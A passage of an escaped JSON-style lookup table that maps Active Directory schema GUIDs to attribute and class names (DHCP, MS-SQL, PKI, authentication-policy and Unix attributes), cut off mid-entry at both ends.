""bf967950-0de6-11d0-a285-00aa003049e2"": ""Description"",\n    ""bf9679c4-0de6-11d0-a285-00aa003049e2"": ""Min-Ticket-Age"",\n    ""fe17e04b-937d-4f7e-8e0e-9292c8d5683e"": ""ms-PKI-RA-Signature"",\n    ""f0f8ffa2-1191-11d0-a060-00aa006c33ed"": ""Phone-Home-Other"",\n    ""28630ebb-41d5-11d1-a9c1-0000f80367c1"": ""User-Principal-Name"",\n    ""90615414-a2a0-4447-a993-53409599b74e"": ""ms-DS-Device-Physical-IDs"",\n    ""eea65906-8ac6-11d0-afda-00c04fd930c9"": ""Desktop-Profile"",\n    ""bf9679c5-0de6-11d0-a285-00aa003049e2"": ""Modified-Count"",\n    ""6617e4ac-a2f1-43ab-b60c-11fbd1facf05"": ""ms-PKI-RoamingTimeStamp"",\n    ""f0f8ffa1-1191-11d0-a060-00aa006c33ed"": ""Phone-Home-Primary"",\n    ""9a9a021f-4a5b-11d1-a9c3-0000f80367c1"": ""User-Shared-Folder"",\n    ""c30181c7-6342-41fb-b279-f7c566cbe0a7"": ""ms-DS-Device-ID"",\n    ""17c2f64e-ccef-11d2-9993-0000f87a57d4"": ""MS-SQL-SQLPublication"",\n    ""99bb1b7a-606d-4f8b-800e-e15be554ca8d"": ""ms-Authz-Central-Access-Rules"",\n    ""974c9a02-33fc-11d3-aa6e-00c04f8eedd8"": ""msExch-Proxy-Gen-Options"",\n    ""bf967951-0de6-11d0-a285-00aa003049e2"": ""Destination-Indicator"",\n    ""bf9679c6-0de6-11d0-a285-00aa003049e2"": ""Modified-Count-At-Last-Prom"",\n    ""b3f93023-9239-4f7c-b99c-6745d87adbc2"": ""ms-PKI-DPAPIMasterKeys"",\n    ""4d146e4b-48d4-11d1-a9c3-0000f80367c1"": ""Phone-Ip-Other"",\n    ""9a9a0220-4a5b-11d1-a9c3-0000f80367c1"": ""User-Shared-Folder-Other"",\n    ""ef65695a-f179-4e6a-93de-b01e06681cfb"": ""ms-DS-Device-Object-Version"",\n    ""963d2750-48be-11d1-a9c3-0000f80367c1"": ""dhcp-Classes"",\n    ""9a7ad94a-ca53-11d1-bbd0-0080c76670c0"": ""Modify-Time-Stamp"",\n    ""b8dfa744-31dc-4ef1-ac7c-84baf7ef9da7"": ""ms-PKI-AccountCredentials"",\n    ""4d146e4a-48d4-11d1-a9c3-0000f80367c1"": ""Phone-Ip-Primary"",\n    ""e16a9db2-403c-11d1-a9c0-0000f80367c1"": ""User-SMIME-Certificate"",\n    ""862166b6-c941-4727-9565-48bfff2941de"": ""ms-DS-Is-Member-Of-DL-Transitive"",\n    ""1d08694a-ccef-11d2-9993-0000f87a57d4"": ""MS-SQL-SQLDatabase"",\n    ""5b4a06dc-251c-4edb-8813-0bdd71327226"": ""ms-Authz-Central-Access-Rule"",\n    ""963d2741-48be-11d1-a9c3-0000f80367c1"": ""dhcp-Flags"",\n    ""bf9679c7-0de6-11d0-a285-00aa003049e2"": ""Moniker"",\n    ""f39b98ad-938d-11d1-aebd-0000f80367c1"": ""ms-RRAS-Attribute"",\n    ""0296c11f-40da-11d1-a9c0-0000f80367c1"": ""Phone-ISDN-Primary"",\n    ""bf9679d7-0de6-11d0-a285-00aa003049e2"": ""User-Workstations"",\n    ""e215395b-9104-44d9-b894-399ec9e21dfc"": ""ms-DS-Member-Transitive"",\n    ""963d2742-48be-11d1-a9c3-0000f80367c1"": ""dhcp-Identification"",\n    ""bf9679c8-0de6-11d0-a285-00aa003049e2"": ""Moniker-Display-Name"",\n    ""f39b98ac-938d-11d1-aebd-0000f80367c1"": ""ms-RRAS-Vendor-Attribute-Entry"",\n    ""0296c11e-40da-11d1-a9c0-0000f80367c1"": ""Phone-Mobile-Other"",\n    ""bf967a6f-0de6-11d0-a285-00aa003049e2"": ""USN-Changed"",\n    ""b918fe7d-971a-f404-9e21-9261abec970b"": ""ms-DS-Parent-Dist-Name"",\n    ""20af031a-ccef-11d2-9993-0000f87a57d4"": ""MS-SQL-OLAPDatabase"",\n    ""a5679cb0-6f9d-432c-8b75-1e3e834f02aa"": ""ms-Authz-Central-Access-Policy"",\n    ""963d2747-48be-11d1-a9c3-0000f80367c1"": ""dhcp-Mask"",\n    ""1f2ac2c8-3b71-11d2-90cc-00c04fd91ab1"": ""Move-Tree-State"",\n    ""a6f24a23-d65c-4d65-a64f-35fb6873c2b9"": ""ms-RADIUS-FramedInterfaceId"",\n    ""f0f8ffa3-1191-11d0-a060-00aa006c33ed"": ""Phone-Mobile-Primary"",\n    ""bf967a70-0de6-11d0-a285-00aa003049e2"": ""USN-Created"",\n    ""1e02d2ef-44ad-46b2-a67d-9fd18d780bca"": ""ms-DS-Repl-Value-Meta-Data-Ext"",\n    ""963d2754-48be-11d1-a9c3-0000f80367c1"": ""dhcp-MaxKey"",\n    ""998b10f7-aa1a-4364-b867-753d197fe670"": ""ms-COM-DefaultPartitionLink"",\n    ""a4da7289-92a3-42e5-b6b6-dad16d280ac9"": ""ms-RADIUS-SavedFramedInterfaceId"",\n    ""f0f8ffa5-1191-11d0-a060-00aa006c33ed"": ""Phone-Office-Other"",\n    ""bf967a71-0de6-11d0-a285-00aa003049e2"": ""USN-DSA-Last-Obj-Removed"",\n    ""6055f766-202e-49cd-a8be-e52bb159edfb"": ""ms-DS-Drs-Farm-ID"",\n    ""09f0506a-cd28-11d2-9993-0000f87a57d4"": ""MS-SQL-OLAPCube"",\n    ""5ef243a8-2a25-45a6-8b73-08a71ae677ce"": ""ms-Kds-Prov-ServerConfiguration"",\n    ""963d2744-48be-11d1-a9c3-0000f80367c1"": ""dhcp-Obj-Description"",\n    ""430f678b-889f-41f2-9843-203b5a65572f"": ""ms-COM-ObjectId"",\n    ""f63ed610-d67c-494d-87be-cd1e24359a38"": ""ms-RADIUS-FramedIpv6Prefix"",\n    ""f0f8ffa4-1191-11d0-a060-00aa006c33ed"": ""Phone-Pager-Other"",\n    ""a8df7498-c5ea-11d1-bbcb-0080c76670c0"": ""USN-Intersite"",\n    ""b5f1edfe-b4d2-4076-ab0f-6148342b0bf6"": ""ms-DS-Issuer-Public-Certificates"",\n    ""963d2743-48be-11d1-a9c3-0000f80367c1"": ""dhcp-Obj-Name"",\n    ""09abac62-043f-4702-ac2b-6ca15eee5754"": ""ms-COM-PartitionLink"",\n    ""0965a062-b1e1-403b-b48d-5c0eb0e952cc"": ""ms-RADIUS-SavedFramedIpv6Prefix"",\n    ""f0f8ffa6-1191-11d0-a060-00aa006c33ed"": ""Phone-Pager-Primary"",\n    ""bf967a73-0de6-11d0-a285-00aa003049e2"": ""USN-Last-Obj-Rem"",\n    ""60686ace-6c27-43de-a4e5-f00c2f8d3309"": ""ms-DS-IsManaged"",\n    ""ca7b9735-4b2a-4e49-89c3-99025334dc94"": ""ms-TAPI-Rt-Conference"",\n    ""aa02fd41-17e0-4f18-8687-b2239649736b"": ""ms-Kds-Prov-RootKey"",\n    ""963d274f-48be-11d1-a9c3-0000f80367c1"": ""dhcp-Options"",\n    ""67f121dc-7d02-4c7d-82f5-9ad4c950ac34"": ""ms-COM-PartitionSetLink"",\n    ""5a5aa804-3083-4863-94e5-018a79a22ec0"": ""ms-RADIUS-FramedIpv6Route"",\n    ""9c979768-ba1a-4c08-9632-c6a5c1ed649a"": ""photo"",\n    ""167758ad-47f3-11d1-a9c3-0000f80367c1"": ""USN-Source"",\n    ""5315ba8e-958f-4b52-bd38-1349a304dd63"": ""ms-DS-Cloud-IsManaged"",\n    ""963d2753-48be-11d1-a9c3-0000f80367c1"": ""dhcp-Properties"",\n    ""9e6f3a4d-242c-4f37-b068-36b57f9fc852"": ""ms-COM-UserLink"",\n    ""9666bb5c-df9d-4d41-b437-2eec7e27c9b3"": ""ms-RADIUS-SavedFramedIpv6Route"",\n    ""bf9679f7-0de6-11d0-a285-00aa003049e2"": ""Physical-Delivery-Office-Name"",\n    ""4d2fa380-7f54-11d2-992a-0000f87a57d4"": ""Valid-Accesses"",\n    ""78565e80-03d4-4fe3-afac-8c3bca2f3653"": ""ms-DS-Cloud-Anchor"",\n    ""53ea1cb5-b704-4df9-818f-5cb4ec86cac1"": ""ms-TAPI-Rt-Person"",\n    ""7b8b558a-93a5-4af7-adca-c017e67f1057"": ""ms-DS-Group-Managed-Service-Account"",\n    ""963d2748-48be-11d1-a9c3-0000f80367c1"": ""dhcp-Ranges"",\n    ""8e940c8a-e477-4367-b08d-ff2ff942dcd7"": ""ms-COM-UserPartitionSetLink"",\n    ""3532dfd8-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-Name"",\n    ""b7b13119-b82e-11d0-afee-0000f80367c1"": ""Physical-Location-Object"",\n    ""281416df-1968-11d0-a28f-00aa003049e2"": ""Vendor"",\n    ""a1e8b54f-4bd6-4fd2-98e2-bcee92a55497"": ""ms-DS-Cloud-Issuer-Public-Certificates"",\n    ""963d274a-48be-11d1-a9c3-0000f80367c1"": ""dhcp-Reservations"",\n    ""e85e1204-3434-41ad-9b56-e2901228fff0"": ""MS-DRM-Identity-Certificate"",\n    ""48fd44ea-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-RegisteredOwner"",\n    ""8d3bca50-1d7e-11d0-a081-00aa006c33ed"": ""Picture"",\n    ""bf967a76-0de6-11d0-a285-00aa003049e2"": ""Version-Number"",\n    ""89848328-7c4e-4f6f-a013-28ce3ad282dc"": ""ms-DS-Cloud-IsEnabled"",\n    ""50ca5d7d-5c8b-4ef3-b9df-5b66d491e526"": ""ms-WMI-IntRangeParam"",\n    ""e3c27fdf-b01d-4f4e-87e7-056eef0eb922"": ""ms-DS-Value-Type"",\n    ""963d2745-48be-11d1-a9c3-0000f80367c1"": ""dhcp-Servers"",\n    ""80863791-dbe9-4eb8-837e-7f0ab55d9ac7"": ""ms-DS-Additional-Dns-Host-Name"",\n    ""4f6cbdd8-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-Contact"",\n    ""fc5a9106-3b9d-11d2-90cc-00c04fd91ab1"": ""PKI-Critical-Extensions"",\n    ""7d6c0e9a-7e20-11d0-afd6-00c04fd930c9"": ""Version-Number-Hi"",\n    ""b7acc3d2-2a74-4fa4-ac25-e63fe8b61218"": ""ms-DS-SyncServerUrl"",\n    ""963d2749-48be-11d1-a9c3-0000f80367c1"": ""dhcp-Sites"",\n    ""975571df-a4d5-429a-9f59-cdc6581d91e6"": ""ms-DS-Additional-Sam-Account-Name"",\n    ""561c9644-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-Location"",\n    ""1ef6336e-3b9e-11d2-90cc-00c04fd91ab1"": ""PKI-Default-CSPs"",\n    ""7d6c0e9b-7e20-11d0-afd6-00c04fd930c9"": ""Version-Number-Lo"",\n    ""de0caa7f-724e-4286-b179-192671efc664"": ""ms-DS-User-Allowed-To-Authenticate-To"",\n    ""292f0d9a-cf76-42b0-841f-b650f331df62"": ""ms-WMI-IntSetParam"",\n    ""2eeb62b3-1373-fe45-8101-387f1676edc7"": ""ms-DS-Claims-Transformation-Policy-Type"",\n    ""963d2752-48be-11d1-a9c3-0000f80367c1"": ""dhcp-State"",\n    ""d3aa4a5c-4e03-4810-97aa-2b339e7a434b"": ""MS-DS-All-Users-Trust-Quota"",\n    ""5b5d448c-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-Memory"",\n    ""426cae6e-3b9d-11d2-90cc-00c04fd91ab1"": ""PKI-Default-Key-Spec"",\n    ""1f0075fd-7e40-11d0-afd6-00c04fd930c9"": ""Vol-Table-GUID"",\n    ""2c4c9600-b0e1-447d-8dda-74902257bdb5"": ""ms-DS-User-Allowed-To-Authenticate-From"",\n    ""963d2746-48be-11d1-a9c3-0000f80367c1"": ""dhcp-Subnets"",\n    ""8469441b-9ac4-4e45-8205-bd219dbf672d"": ""ms-DS-Allowed-DNS-Suffixes"",\n    ""603e94c4-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-Build"",\n    ""926be278-56f9-11d2-90d0-00c04fd91ab1"": ""PKI-Enrollment-Access"",\n    ""1f0075fb-7e40-11d0-afd6-00c04fd930c9"": ""Vol-Table-Idx-GUID"",\n    ""8521c983-f599-420f-b9ab-b1222bdf95c1"": ""ms-DS-User-TGT-Lifetime"",\n    ""07502414-fdca-4851-b04a-13645b11d226"": ""ms-WMI-MergeablePolicyTemplate"",\n    ""c8fca9b1-7d88-bb4f-827a-448927710762"": ""ms-DS-Claims-Transformation-Policies"",\n    ""963d273b-48be-11d1-a9c3-0000f80367c1"": ""dhcp-Type"",\n    ""800d94d7-b7a1-42a1-b14d-7cae1423d07f"": ""ms-DS-Allowed-To-Delegate-To"",\n    ""64933a3e-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-ServiceAccount"",\n    ""041570d2-3b9e-11d2-90cc-00c04fd91ab1"": ""PKI-Expiration-Period"",\n    ""34aaa217-b699-11d0-afee-0000f80367c1"": ""Volume-Count"",\n    ""105babe9-077e-4793-b974-ef0410b62573"": ""ms-DS-Computer-Allowed-To-Authenticate-To"",\n    ""963d273a-48be-11d1-a9c3-0000f80367c1"": ""dhcp-Unique-Key"",\n    ""c4af1073-ee50-4be0-b8c0-89a41fe99abe"": ""ms-DS-Auxiliary-Classes"",\n    ""696177a6-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-CharacterSet"",\n    ""18976af6-3b9e-11d2-90cc-00c04fd91ab1"": ""PKI-Extended-Key-Usage"",\n    ""244b2970-5abd-11d0-afd2-00c04fd930c9"": ""Wbem-Path"",\n    ""2e937524-dfb9-4cac-a436-a5b7da64fd66"": ""ms-DS-Computer-TGT-Lifetime"",\n    ""55dd81c9-c312-41f9-a84d-c6adbdf1e8e1"": ""ms-WMI-ObjectEncoding"",\n    ""641e87a4-8326-4771-ba2d-c706df35e35a"": ""ms-DS-Cloud-Extensions"",\n    ""963d2755-48be-11d1-a9c3-0000f80367c1"": ""dhcp-Update-Time"",\n    ""e185d243-f6ce-4adb-b496-b0c005d7823c"": ""ms-DS-Approx-Immed-Subordinates"",\n    ""6ddc42c0-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-SortOrder"",\n    ""e9b0a87e-3b9d-11d2-90cc-00c04fd91ab1"": ""PKI-Key-Usage"",\n    ""05308983-7688-11d1-aded-00c04fd8d5cd"": ""Well-Known-Objects"",\n    ""f2973131-9b4d-4820-b4de-0474ef3b849f"": ""ms-DS-Service-Allowed-To-Authenticate-To"",\n    ""bf967953-0de6-11d0-a285-00aa003049e2"": ""Display-Name"",\n    ""3e1ee99c-6604-4489-89d9-84798a89515a"": ""ms-DS-AuthenticatedAt-DC"",\n    ""72dc918a-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-UnicodeSortOrder"",\n    ""f0bfdefa-3b9d-11d2-90cc-00c04fd91ab1"": ""PKI-Max-Issuing-Depth"",\n    ""bf967a77-0de6-11d0-a285-00aa003049e2"": ""When-Changed"",\n    ""97da709a-3716-4966-b1d1-838ba53c3d89"": ""ms-DS-Service-Allowed-To-Authenticate-From"",\n    ""e2bc80f1-244a-4d59-acc6-ca5c4f82e6e1"": ""ms-WMI-PolicyTemplate"",\n    ""310b55ce-3dcd-4392-a96d-c9e35397c24f"": ""ms-DS-Device-Registration-Service-Container"",\n    ""bf967954-0de6-11d0-a285-00aa003049e2"": ""Display-Name-Printable"",\n    ""e8b2c971-a6df-47bc-8d6f-62770d527aa5"": ""ms-DS-AuthenticatedTo-Accountlist"",\n    ""7778bd90-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-Clustered"",\n    ""1219a3ec-3b9e-11d2-90cc-00c04fd91ab1"": ""PKI-Overlap-Period"",\n    ""bf967a78-0de6-11d0-a285-00aa003049e2"": ""When-Created"",\n    ""5dfe3c20-ca29-407d-9bab-8421e55eb75c"": ""ms-DS-Service-TGT-Lifetime"",\n    ""9a7ad946-ca53-11d1-bbd0-0080c76670c0"": ""DIT-Content-Rules"",\n    ""503fc3e8-1cc6-461a-99a3-9eee04f402a7"": ""ms-DS-Az-Application-Data"",\n    ""7b91c840-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-NamedPipe"",\n    ""8447f9f1-1027-11d0-a05f-00aa006c33ed"": ""PKT"",\n    ""bf967a79-0de6-11d0-a285-00aa003049e2"": ""Winsock-Addresses"",\n    ""b23fc141-0df5-4aea-b33d-6cf493077b3f"": ""ms-DS-Assigned-AuthN-Policy-Silo"",\n    ""595b2613-4109-4e77-9013-a3bb4ef277c7"": ""ms-WMI-PolicyType"",\n    ""96bc3a1a-e3d2-49d3-af11-7b0df79d67f5"": ""ms-DS-Device-Registration-Service"",\n    ""fe6136a0-2073-11d0-a9c2-00aa006c33ed"": ""Division"",\n    ""db5b0728-6208-4876-83b7-95d3e5695275"": ""ms-DS-Az-Application-Name"",\n    ""8157fa38-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-MultiProtocol"",\n    ""8447f9f0-1027-11d0-a05f-00aa006c33ed"": ""PKT-Guid"",\n    ""bf967a7a-0de6-11d0-a285-00aa003049e2"": ""WWW-Home-Page"",\n    ""33140514-f57a-47d2-8ec4-04c4666600c7"": ""ms-DS-Assigned-AuthN-Policy-Silo-BL"",\n    ""f0f8ff8b-1191-11d0-a060-00aa006c33ed"": ""DMD-Location"",\n    ""7184a120-3ac4-47ae-848f-fe0ab20784d4"": ""ms-DS-Az-Application-Version"",\n    ""86b08004-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-SPX"",\n    ""19405b96-3cfa-11d1-a9c0-0000f80367c1"": ""Policy-Replication-Flags"",\n    ""9a9a0221-4a5b-11d1-a9c3-0000f80367c1"": ""WWW-Page-Other"",\n    ""164d1e05-48a6-4886-a8e9-77a2006e3c77"": ""ms-DS-AuthN-Policy-Silo-Members"",\n    ""45fb5a57-5018-4d0f-9056-997c8c9122d9"": ""ms-WMI-RangeParam"",\n    ""7c9e8c58-901b-4ea8-b6ec-4eb9e9fc0e11"": ""ms-DS-Device-Container"",\n    ""167757b9-47f3-11d1-a9c3-0000f80367c1"": ""DMD-Name"",\n    ""33d41ea8-c0c9-4c92-9494-f104878413fd"": ""ms-DS-Az-Biz-Rule"",\n    ""8ac263a6-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-TCPIP"",\n    ""281416c4-1968-11d0-a28f-00aa003049e2"": ""Port-Name"",\n    ""bf967a7b-0de6-11d0-a285-00aa003049e2"": ""X121-Address"",\n    ""11fccbc7-fbe4-4951-b4b7-addf6f9efd44"": ""ms-DS-AuthN-Policy-Silo-Members-BL"",\n    ""2df90d86-009f-11d2-aa4c-00c04fd7d83a"": ""DN-Reference-Update"",\n    ""52994b56-0e6c-4e07-aa5c-ef9d7f5a0e25"": ""ms-DS-Az-Biz-Rule-Language"",\n    ""8fda89f4-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-AppleTalk"",\n    ""bf9679fa-0de6-11d0-a285-00aa003049e2"": ""Poss-Superiors"",\n    ""d07da11f-8a3d-42b6-b0aa-76c962be719a"": ""x500uniqueIdentifier"",\n    ""cd26b9f3-d415-442a-8f78-7c61523ee95b"": ""ms-DS-User-AuthN-Policy"",\n    ""6afe8fe2-70bc-4cce-b166-a96f7359c514"": ""ms-WMI-RealRangeParam"",\n    ""d2b1470a-8f84-491e-a752-b401ee00fe5c"": ""ms-DS-AuthN-Policy-Silos"",\n    ""e0fa1e65-9b45-11d0-afdd-00c04fd930c9"": ""Dns-Allow-Dynamic"",\n    ""013a7277-5c2d-49ef-a7de-b765b36a3f6f"": ""ms-DS-Az-Class-ID"",\n    ""94c56394-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-Vines"",\n    ""9a7ad94c-ca53-11d1-bbd0-0080c76670c0"": ""Possible-Inferiors"",\n    ""bf967a7f-0de6-11d0-a285-00aa003049e2"": ""X509-Cert"",\n    ""2f17faa9-5d47-4b1f-977e-aa52fabe65c8"": ""ms-DS-User-AuthN-Policy-BL"",\n    ""e0fa1e66-9b45-11d0-afdd-00c04fd930c9"": ""Dns-Allow-XFR"",\n    ""6448f56a-ca70-4e2e-b0af-d20e4ce653d0"": ""ms-DS-Az-Domain-Timeout"",\n    ""9a7d4770-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-Status"",\n    ""bf9679fb-0de6-11d0-a285-00aa003049e2"": ""Post-Office-Box"",\n    ""612cb747-c0e8-4f92-9221-fdd5f15b550d"": ""UnixUserPassword"",\n    ""afb863c9-bea3-440f-a9f3-6153cc668929"": ""ms-DS-Computer-AuthN-Policy"",\n    ""3c7e6f83-dd0e-481b-a0c2-74cd96ef2a66"": ""ms-WMI-Rule"",\n    ""3a9adf5d-7b97-4f7e-abb4-e5b55c1c06b4"": ""ms-DS-AuthN-Policies"",\n    ""72e39547-7b18-11d1-adef-00c04fd8d5cd"": ""DNS-Host-Name"",\n    ""f90abab0-186c-4418-bb85-88447c87222a"": ""ms-DS-Az-Generate-Audits"",\n    ""9fcc43d4-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-LastUpdatedDate"",\n    ""bf9679fc-0de6-11d0-a285-00aa003049e2"": ""Postal-Address"",\n    ""850fcc8f-9c6b-47e1-b671-7c654be4d5b3"": ""UidNumber"",\n    ""2bef6232-30a1-457e-8604-7af6dbf131b8"": ""ms-DS-Computer-AuthN-Policy-BL"",\n    ""e0fa1e68-9b45-11d0-afdd-00c04fd930c9"": ""Dns-Notify-Secondaries"",\n    ""665acb5c-bb92-4dbc-8c59-b3638eab09b3"": ""ms-DS-Az-Last-Imported-Biz-Rule-Path"",\n    ""a42cd510-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-InformationURL"",\n    ""bf9679fd-0de6-11d0-a285-00aa003049e2"": ""Postal-Code"",\n    ""c5b95f0c-ec9e-41c4-849c-b46597ed6696"": ""GidNumber"",\n    ""2a6a6d95-28ce-49ee-bb24-6d1fc01e3111"": ""ms-DS-Service-AuthN-Policy"",\n    ""f1e44bdf-8dd3-4235-9c86-f91f31f5b569"": ""ms-WMI-ShadowObject"",\n    ""f9f0461e-697d-4689-9299-37e61d617b0d"": ""ms-DS-AuthN-Policy-Silo"",\n    ""675a15fe-3b70-11d2-90cc-00c04fd91ab1"": ""DNS-Property"",\n    ""5e53368b-fc94-45c8-9d7d-daf31ee7112d"": ""ms-DS-Az-LDAP-Query"",\n    ""a92d23da-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-ConnectionURL"",\n    ""bf9679fe-0de6-11d0-a285-00aa003049e2"": ""Preferred-Delivery-Method"",\n    ""a3e03f1f-1d55-4253-a0af-30c2a784e46e"": ""Gecos"",\n    ""2c1128ec-5aa2-42a3-b32d-f0979ca9fcd2"": ""ms-DS-Service-AuthN-Policy-BL"",\n    ""f60a8f96-57c4-422c-a3ad-9e2fa09ce6f7"": ""ms-DS-Device-MDMStatus"",\n    ""e0fa1e69-9b45-11d0-afdd-00c04fd930c9"": ""Dns-Record"",\n    ""cfb9adb7-c4b7-4059-9568-1ed9db6b7248"": ""ms-DS-Az-Major-Version"",\n    ""ae0c11b8-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-PublicationURL"",\n    ""856be0d0-18e7-46e1-8f5f-7ee4d9020e0d"": ""preferredLanguage"",\n    ""bc2dba12-000f-464d-bf1d-0808465d8843"": ""UnixHomeDirectory"",\n    ""b87a0ad8-54f7-49c1-84a0-e64d12853588"": ""ms-DS-Assigned-AuthN-Policy"",\n    ""6cc8b2b5-12df-44f6-8307-e74f5cdee369"": ""ms-WMI-SimplePolicyTemplate"",\n    ""a11703b7-5641-4d9c-863e-5fb3325e74e0"": ""ms-DS-GeoCoordinates-Altitude"",\n    ""bf967959-0de6-11d0-a285-00aa003049e2"": ""Dns-Root"",\n    ""ee85ed93-b209-4788-8165-e702f51bfbf3"": ""ms-DS-Az-Minor-Version"",\n    ""b222ba0e-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-GPSLatitude"",\n    ""bf9679ff-0de6-11d0-a285-00aa003049e2"": ""Preferred-OU"",\n    ""a553d12c-3231-4c5e-8adf-8d189697721e"": ""LoginShell"",\n    ""2d131b3c-d39f-4aee-815e-8db4bc1ce7ac"": ""ms-DS-Assigned-AuthN-Policy-BL"",\n    ""dc66d44e-3d43-40f5-85c5-3c12e169927e"": ""ms-DS-GeoCoordinates-Latitude"",\n    ""e0fa1e67-9b45-11d0-afdd-00c04fd930c9"": ""Dns-Secure-Secondaries"",\n    ""a5f3b553-5d76-4cbe-ba3f-4312152cab18"": ""ms-DS-Az-Operation-ID"",\n    ""b7577c94-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-GPSLongitude"",\n    ""52458022-ca6a-11d0-afff-0000f80367c1"": ""Prefix-Map"",\n    ""f8f2689c-29e8-4843-8177-e8b98e15eeac"": ""ShadowLastChange"",\n    ""7a560cc2-ec45-44ba-b2d7-21236ad59fd5"": ""ms-DS-AuthN-Policy-Enforced"",\n    ""ab857078-0142-4406-945b-34c9b6b13372"": ""ms-WMI-Som"",\n    ""94c42110-bae4-4cea-8577-af813af5da25"": ""ms-DS-GeoCoordinates-Longitude"",\n    ""d5eb2eb7-be4e-463b-a214-634a44d7392e"": ""DNS-Tombstoned"",\n    ""515a6b06-2617-4173-8099-d5605df043c6"": ""ms-DS-Az-Scope-Name"",\n    ""bcdd4f0e-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-GPSHeight"",\n    ""a8df744b-c5ea-11d1-bbcb-0080c76670c0"": ""Presentation-Address"",\n    ""a76b8737-e5a1-4568-b057-dc12e04be4b2"": ""ShadowMin"",\n    ""f2f51102-6be0-493d-8726-1546cdbc8771"": ""ms-DS-AuthN-Policy-Silo-Enforced"",\n    ""bd29bf90-66ad-40e1-887b-10df070419a6"": ""ms-DS-External-Directory-Object-Id"",\n    ""f18a8e19-af5f-4478-b096-6f35c27eb83f"": ""documentAuthor"",\n    ""2629f66a-1f95-4bf3-a296-8e9d7b9e30c8"": ""ms-DS-Az-Script-Engine-Cache-Max"",\n    ""c07cc1d0-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-Version"",\n    ""963d2739-48be-11d1-a9c3-0000f80367c1"": ""Previous-CA-Certificates"",\n    ""f285c952-50dd-449e-9160-3b880d99988d"": ""ShadowMax"",\n    ""0bc579a2-1da7-4cea-b699-807f3b9d63a4"": ""ms-WMI-StringSetParam"",\n    ""0b21ce82-ff63-46d9-90fb-c8b9f24e97b9"": ""documentIdentifier"",\n    ""87d0fb41-2c8b-41f6-b972-11fdfd50d6b0"": ""ms-DS-Az-Script-Timeout"",\n    ""c57f72f4-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-Language"",\n    ""963d273d-48be-11d1-a9c3-0000f80367c1"": ""Previous-Parent-CA"",\n    ""7ae89c9c-2976-4a46-bb8a-340f88560117"": ""ShadowWarning"",\n    ""2628a46a-a6ad-4ae0-b854-2b12d9fe6f9e"": ""account"",\n    ""bf967aa1-0de6-11d0-a285-00aa003049e2"": ""Mail-Recipient"",\n    ""b958b14e-ac6d-4ec4-8892-be70b69f7281"": ""documentLocation"",\n    ""7b078544-6c82-4fe9-872f-ff48ad2b2e26"": ""ms-DS-Az-Task-Is-Role-Definition"",\n    ""8386603c-ccef-11d2-9993-0000f87a57d4"": ""MS-SQL-Description"",\n    ""bf967a00-0de6-11d0-a285-00aa003049e2"": ""Primary-Group-ID"",\n    ""86871d1f-3310-4312-8efd-af49dcfb2671"": ""ShadowInactive"",\n    ""bf967a83-0de6-11d0-a285-00aa003049e2"": ""Class-Schema"",\n    ""d9a799b2-cef3-48b3-b5ad-fb85f8dd3214"": ""ms-WMI-UintRangeParam"",\n    ""59527d0f-b7c0-4ce2-a1dd-71cef6963292"": ""ms-DS-Is-Compliant"",\n    ""170f09d7-eb69-448a-9a30-f1afecfd32d7"": ""documentPublisher"",\n    ""8491e548-6c38-4365-a732-af041569b02c"": ""ms-DS-Az-Object-Guid"",\n    ""ca48eba8-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-Type"",\n    ""c0ed8738-7efd-4481-84d9-66d2db8be369"": ""Primary-Group-Token"",\n    ""75159a00-1fff-4cf4-8bff-4ef2695cf643"": ""ShadowExpire"",\n    ""d1328fbc-8574-4150-881d-0b1088827878"": ""ms-DS-Key-Principal-BL"",\n    ""de265a9c-ff2c-47b9-91dc-6e6fe2c43062"": ""documentTitle"",\n    ""b5f7e349-7a5b-407c-a334-a31c3f538b98"": ""ms-DS-Az-Generic-Data"",\n    ""d0aedb2e-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-InformationDirectory"",\n    ""281416d7-1968-11d0-a28f-00aa003049e2"": ""Print-Attributes"",\n    ""8dfeb70d-c5db-46b6-b15e-a4389e6cee9b"": ""ShadowFlag"",\n    ""7f561288-5301-11d1-a9c5-0000f80367c1"": ""ACS-Policy"",\n    ""8f4beb31-4e19-46f5-932e-5fa03c339b1d"": ""ms-WMI-UintSetParam"",\n    ""c4a46807-6adc-4bbb-97de-6bed181a1bfe"": ""ms-DS-Device-Trust-Type"",\n    ""94b3a8a9-d613-4cec-9aad-5fbcc1046b43"": ""documentVersion"",\n    ""d31a8757-2447-4545-8081-3bb610cacbf2"": ""ms-DS-Behavior-Version"",\n    ""d5a0dbdc-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-Database"",\n    ""281416cd-1968-11d0-a28f-00aa003049e2"": ""Print-Bin-Names"",\n    ""03dab236-672e-4f61-ab64-f77d2dc2ffab"": ""MemberUid"",\n    ""1dcc0722-aab0-4fef-956f-276fe19de107"": ""ms-DS-Shadow-Principal-Sid"",\n    ""7bfdcb7a-4807-11d1-a9c3-0000f80367c1"": ""Domain-Certificate-Authorities"",\n    ""f0d8972e-dd5b-40e5-a51d-044c7c17ece7"": 